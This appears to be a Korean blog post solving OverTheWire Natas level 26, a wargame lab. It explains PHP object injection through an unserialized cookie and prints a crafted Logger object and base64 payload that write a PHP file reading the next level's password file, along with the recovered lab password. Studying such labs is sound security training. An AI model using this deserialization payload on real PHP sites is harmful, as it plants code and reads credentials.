@@ -1,0 +1,240 @@
+<!doctype html>
+<html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Natas 워게임 level26 풀이 - Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="브으으을로그"><meta name="msapplication-TileImage" content="/img/catfavicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="브으으을로그"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Level Goal Draw a line:   선을 그리다:  Username: natas26URL:      http:&amp;#x2F;&amp;#x2F;natas26.natas.labs.overthewire.org"><meta property="og:type" content="blog"><meta property="og:title" content="브으으을로로오오그으으"><meta property="og:url" content="https://ogaree.github.io/2022/02/14/Natas/natas26/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="Level Goal Draw a line:   선을 그리다:  Username: natas26URL:      http:&amp;#x2F;&amp;#x2F;natas26.natas.labs.overthewire.org"><meta property="og:locale" content="ko_KR"><meta property="og:image" content="https://github.com/OGAREE/ogaree.github.io/blob/master/img/natas/level26/nataslevel26-1.jpg?raw=true"><meta property="og:image" content="https://github.com/OGAREE/ogaree.github.io/blob/master/img/natas/level26/nataslevel26-2.jpg?raw=true"><meta property="og:image" content="https://github.com/OGAREE/ogaree.github.io/blob/master/img/natas/level26/nataslevel26-3.jpg?raw=true"><meta property="article:published_time" content="2022-02-14T07:09:28.856Z"><meta property="article:modified_time" content="2022-02-14T07:09:28.856Z"><meta property="article:author" content="OAGAREE"><meta property="article:tag" content="natas"><meta property="article:tag" content="PHP Object Injection"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://github.com/OGAREE/ogaree.github.io/blob/master/img/natas/level26/nataslevel26-1.jpg?raw=true"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://ogaree.github.io/2022/02/14/Natas/natas26/"},"headline":"Natas 워게임 level26 풀이","image":[],"datePublished":"2022-02-14T07:09:28.856Z","dateModified":"2022-02-14T07:09:28.856Z","author":{"@type":"Person","name":"OAGAREE"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://ogaree.github.io/img/catlogo.svg"}},"description":"Level Goal Draw a line:   선을 그리다:  Username: natas26URL:      http:&#x2F;&#x2F;natas26.natas.labs.overthewire.org"}</script><link rel="canonical" href="https://ogaree.github.io/2022/02/14/Natas/natas26/"><link rel="icon" href="/img/catfavicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/catlogo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/OGAREE"><i class="fab fa-github"></i></a><a class="navbar-item search" title="검색" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-02-14T07:09:28.856Z" title="2022. 2. 14. 오전 7:09:28">2022-02-14</time>&nbsp;게시 됨</span><span class="level-item"><time dateTime="2022-02-14T07:09:28.856Z" title="2022. 2. 14. 오전 7:09:28">2022-02-14</time>&nbsp;업데이트 됨</span><span class="level-item"><a class="link-muted" href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/">웹해킹</a><span> / </span><a class="link-muted" href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/">natas</a></span><span class="level-item">7분안에 읽기 (약 1103 단어)</span></div></div><h1 class="title is-3 is-size-4-mobile">Natas 워게임 level26 풀이</h1><div class="content"><h3 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h3><blockquote>
+<p>Draw a line:</p>
+</blockquote>
+<ul>
+<li>선을 그리다:</li>
+</ul>
+<p>Username: natas26<br>URL:      <a target="_blank" rel="noopener" href="http://natas26.natas.labs.overthewire.org/">http://natas26.natas.labs.overthewire.org</a></p>
+<span id="more"></span>
+
+<p>일단 뭔가 4개의 입력값을 받아 선을 그리는 것 같다. 왜 입력값이 4개지?</p>
+<p><img src="https://github.com/OGAREE/ogaree.github.io/blob/master/img/natas/level26/nataslevel26-1.jpg?raw=true"></p>
+<p>일단 소스코드를 본다.</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall-data.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = &#123; &quot;level&quot;: &quot;natas26&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; &#125;;&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+    
+    class Logger&#123;
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file)&#123;
+            // initialise variables
+            $this-&gt;initMsg=&quot;#--session started--#\n&quot;;
+            $this-&gt;exitMsg=&quot;#--session end--#\n&quot;;
+            $this-&gt;logFile = &quot;/tmp/natas26_&quot; . $file . &quot;.log&quot;;
+      
+            // write initial message
+            $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        &#125;                       
+      
+        function log($msg)&#123;
+            $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+            fwrite($fd,$msg.&quot;\n&quot;);
+            fclose($fd);
+        &#125;                       
+      
+        function __destruct()&#123;
+            // write exit message
+            $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+            fwrite($fd,$this-&gt;exitMsg);
+            fclose($fd);
+        &#125;                       
+    &#125;
+ 
+    function showImage($filename)&#123;
+        if(file_exists($filename))
+            echo &quot;&lt;img src=\&quot;$filename\&quot;&gt;&quot;;
+    &#125;
+
+    function drawImage($filename)&#123;
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);     
+        imagedestroy($img);
+    &#125;
+    
+    function drawFromUserdata($img)&#123;
+        if( array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;
+            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET))&#123;
+        
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET[&quot;x1&quot;], $_GET[&quot;y1&quot;], 
+                            $_GET[&quot;x2&quot;], $_GET[&quot;y2&quot;], $color);
+        &#125;
+        
+        if (array_key_exists(&quot;drawing&quot;, $_COOKIE))&#123;
+            $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists(&quot;x1&quot;, $object) &amp;&amp; 
+                        array_key_exists(&quot;y1&quot;, $object) &amp;&amp;
+                        array_key_exists(&quot;x2&quot;, $object) &amp;&amp; 
+                        array_key_exists(&quot;y2&quot;, $object))&#123;
+                    
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object[&quot;x1&quot;],$object[&quot;y1&quot;],
+                                $object[&quot;x2&quot;] ,$object[&quot;y2&quot;] ,$color);
+            
+                    &#125;
+        &#125;    
+    &#125;
+    
+    function storeData()&#123;
+        $new_object=array();
+
+        if(array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;
+            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET))&#123;
+            $new_object[&quot;x1&quot;]=$_GET[&quot;x1&quot;];
+            $new_object[&quot;y1&quot;]=$_GET[&quot;y1&quot;];
+            $new_object[&quot;x2&quot;]=$_GET[&quot;x2&quot;];
+            $new_object[&quot;y2&quot;]=$_GET[&quot;y2&quot;];
+        &#125;
+        
+        if (array_key_exists(&quot;drawing&quot;, $_COOKIE))&#123;
+            $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));
+        &#125;
+        else&#123;
+            // create new array
+            $drawing=array();
+        &#125;
+        
+        $drawing[]=$new_object;
+        setcookie(&quot;drawing&quot;,base64_encode(serialize($drawing)));
+    &#125;
+?&gt;
+
+&lt;h1&gt;natas26&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+
+Draw a line:&lt;br&gt;
+&lt;form name=&quot;input&quot; method=&quot;get&quot;&gt;
+X1&lt;input type=&quot;text&quot; name=&quot;x1&quot; size=2&gt;
+Y1&lt;input type=&quot;text&quot; name=&quot;y1&quot; size=2&gt;
+X2&lt;input type=&quot;text&quot; name=&quot;x2&quot; size=2&gt;
+Y2&lt;input type=&quot;text&quot; name=&quot;y2&quot; size=2&gt;
+&lt;input type=&quot;submit&quot; value=&quot;DRAW!&quot;&gt;
+&lt;/form&gt; 
+
+&lt;?php
+    session_start();
+
+    if (array_key_exists(&quot;drawing&quot;, $_COOKIE) ||
+        (   array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;
+            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET)))&#123;  
+        $imgfile=&quot;img/natas26_&quot; . session_id() .&quot;.png&quot;; 
+        drawImage($imgfile); 
+        showImage($imgfile);
+        storeData();
+    &#125;
+    
+?&gt;
+
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>첫번째 점의 x,y좌표와 두번째 점의 x,y좌표를 입력받아 선으로 이어주는 코드다!</p>
+<p>drawing변수에 get으로 넘어온 배열값을 직렬화(일렬화) 시켜주고 base64로 인코딩하여 넣은 값을 쿠키값에 붙여주는 코드도 있다.</p>
+<p>뭐 어떻게 풀어야할지 감도 안잡힌다.<br>어떤 함수가 어떠한 기능을 하는지도..(응애 나 초보.. 아무것도 몰라)</p>
+<p>일단 보이는 함수를 검색해보고 관련 취약점도 검색해 보자!</p>
+<p>__construct에서 취약점을 검색하였는데 PHP Object Injection에 관한 내용이 있었다.</p>
+<blockquote>
+<p>출처 및 참고 : <a target="_blank" rel="noopener" href="https://blog.naver.com/lstarrlodyl/222172446060">https://blog.naver.com/lstarrlodyl/222172446060</a><br><a target="_blank" rel="noopener" href="https://velog.io/@woounnan/WEB-PHP-Serialization">https://velog.io/@woounnan/WEB-PHP-Serialization</a></p>
+</blockquote>
+<p>__construct나 __destruct등 함수는 Magic Method라 불리는데<br>Magic Method는 직렬화 기능 즉, serialize기능이 수행될 때 자동적으로 실행되는 취약점이 발생한다.</p>
+<blockquote>
+<p>Object Injection<br>오브젝트는 클래스가 인스턴스화된 객체를 말한다.<br>안에는 그 오브젝트의 메소드, 변수 등 관련된 값이 포함되어있다.<br>serialize로 인해 이런 오브젝트 값을 직렬화시켜 외부에 전달하거나 전달받아 관련된 처리를 하는 형태의 코드를 작성할 수 있게 되었다.<br>하지만 이런 구조의 웹서버에 변조된 오브젝트를 전달한다면?<br>웹서버는 조작된 값을 그대로 받아 의도하지 않은 데이터나 코드를 실행할 것이다.<br>이게 바로 php의 serialize에 의해 발생할 수 있는 Object Injection 취약점이다.</p>
+</blockquote>
+<p>drawing 값을 unserialize하여 코드를 실행하는 drawFromUserdata에서 취약점이 발생하였다.</p>
+<p>drawing 값에 /etc/natas_webpass/natas27의 내용을 출력하는 코드를 넣으면 될 것 같다.<br>코드는 __construct를 이용하여 만든다.</p>
+<blockquote>
+<p>인스턴스가 생성될 때 자동으로 호출되는 함수이다.<br>인스턴스를 생성했을 때 코드를 base64로 인코딩하면 된다.</p>
+</blockquote>
+<p><img src="https://github.com/OGAREE/ogaree.github.io/blob/master/img/natas/level26/nataslevel26-2.jpg?raw=true"></p>
+<pre><code>&lt;?php
+class Logger&#123;
+  private $logFile;
+  private $initMsg;
+  private $exitMsg;
+  function __construct()&#123;
+    $this-&gt;initMsg=&quot;&quot;; // 여기에다가 php코드를 넣어 봤는데 실행이 안됨
+    $this-&gt;exitMsg=&quot;&lt;?php readfile(&#39;/etc/natas_webpass/natas27&#39;);?&gt;&quot;;
+    $this-&gt;logFile=&quot;img/natas27_passwd.php&quot;; //이미지 파일 저장 경로를 참고함
+  &#125;
+&#125;
+  $code = new Logger();
+  echo base64_encode(serialize($code));
+?&gt;
+</code></pre>
+<ul>
+<li>Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMjoiaW1nL25hdGFzMjdfcGFzc3dkLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ3OiI8P3BocCByZWFkZmlsZSgnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiI7fQ==</li>
+</ul>
+<p>이를 넣어 요청을 한뒤 설정해놓은 경로로 이동해본다.</p>
+<p><img src="https://github.com/OGAREE/ogaree.github.io/blob/master/img/natas/level26/nataslevel26-3.jpg?raw=true"></p>
+<p>level27의 패스워드를 찾았다!</p>
+<pre>
+    55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+</pre>
+</div><div class="article-licensing box"><div class="licensing-title"><p>Natas 워게임 level26 풀이</p><p><a href="https://ogaree.github.io/2022/02/14/Natas/natas26/">https://ogaree.github.io/2022/02/14/Natas/natas26/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>OAGAREE</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-02-14</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-02-14</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/natas/">natas</a><a class="link-muted mr-2" rel="tag" href="/tags/PHP-Object-Injection/">PHP Object Injection</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/02/14/GTFObins/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">해킹할 때 유용한 사이트</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/02/04/Natas/natas25/"><span class="level-item">Natas 워게임 level25 풀이</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-3-tablet is-3-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/catavatar.png" alt="오가리"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">오가리</p><p class="is-size-6 is-block">보안을 배우고파</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>대한민국</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">포스트</p><a href="/archives"><p class="title">63</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">카테고리</p><a href="/categories"><p class="title">2</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">태그</p><a href="/tags"><p class="title">20</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ogaree" target="_blank" rel="noopener">팔로우</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ogaree"><i class="fab fa-github"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">카테고리</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/"><span class="level-start"><span class="level-item">웹해킹</span></span><span class="level-end"><span class="level-item tag">28</span></span></a><ul><li><a class="level is-mobile" href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/"><span class="level-start"><span class="level-item">natas</span></span><span class="level-end"><span class="level-item tag">28</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">최근 글</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-14T08:34:00.235Z">2022-02-14</time></p><p class="title"><a href="/2022/02/14/Natas/natas27/">Natas 워게임 level27 풀이</a></p><p class="categories"><a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/">웹해킹</a> / <a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/">natas</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-14T07:45:49.806Z">2022-02-14</time></p><p class="title"><a href="/2022/02/14/GTFObins/">해킹할 때 유용한 사이트</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-14T07:09:28.856Z">2022-02-14</time></p><p class="title"><a href="/2022/02/14/Natas/natas26/">Natas 워게임 level26 풀이</a></p><p class="categories"><a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/">웹해킹</a> / <a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/">natas</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-04T08:23:32.279Z">2022-02-04</time></p><p class="title"><a href="/2022/02/04/Natas/natas25/">Natas 워게임 level25 풀이</a></p><p class="categories"><a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/">웹해킹</a> / <a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/">natas</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-02-02T05:37:53.585Z">2022-02-02</time></p><p class="title"><a href="/2022/02/02/Natas/natas24/">Natas 워게임 level24 풀이</a></p><p class="categories"><a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/">웹해킹</a> / <a href="/categories/%EC%9B%B9%ED%95%B4%ED%82%B9/natas/">natas</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">아카이브</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">2월 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">1월 2022</span></span><span class="level-end"><span class="level-item tag">56</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">태그</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/inc/"><span class="tag">.inc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/HxD/"><span class="tag">HxD</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP-Object-Injection/"><span class="tag">PHP Object Injection</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XOR/"><span class="tag">XOR</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bandit/"><span class="tag">bandit</span><span class="tag">32</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blind-sql-injection/"><span class="tag">blind sql injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/brute-force/"><span class="tag">brute force</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/burp-suite/"><span class="tag">burp suite</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command-injection/"><span class="tag">command injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cookie/"><span class="tag">cookie</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/directory-traversal/"><span class="tag">directory traversal</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/file-upload/"><span class="tag">file upload</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/natas/"><span class="tag">natas</span><span class="tag">28</span></a></div><div class="control"><a class="tags has-addons" href="/tags/robots-txt/"><span class="tag">robots.txt</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql-injection/"><span class="tag">sql injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/strcmp-%EC%B7%A8%EC%95%BD%EC%A0%90/"><span class="tag">strcmp 취약점</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/time-based-blind-injection/"><span class="tag">time based blind injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web-socket/"><span class="tag">web socket</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%EC%95%94%ED%98%B8/"><span class="tag">암호</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%ED%8C%8C%EC%9D%BC-%EC%8B%9C%EA%B7%B8%EB%8B%88%EC%B2%98/"><span class="tag">파일 시그니처</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/catlogo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2022 OAGAREE</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/OGAREE"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("ko");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="맨 위로" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "이 웹 사이트는 귀하의 경험을 향상시키기 위해 Cookie를 사용합니다.",
+          dismiss: "무시",
+          allow: "허용",
+          deny: "거부",
+          link: "더 알아보기",
+          policy: "Cookie 정책",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="입력 하세요..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"입력 하세요...","untitled":"(제목 없음)","posts":"포스트","pages":"페이지","categories":"카테고리","tags":"태그"});
+        });</script></body></html>
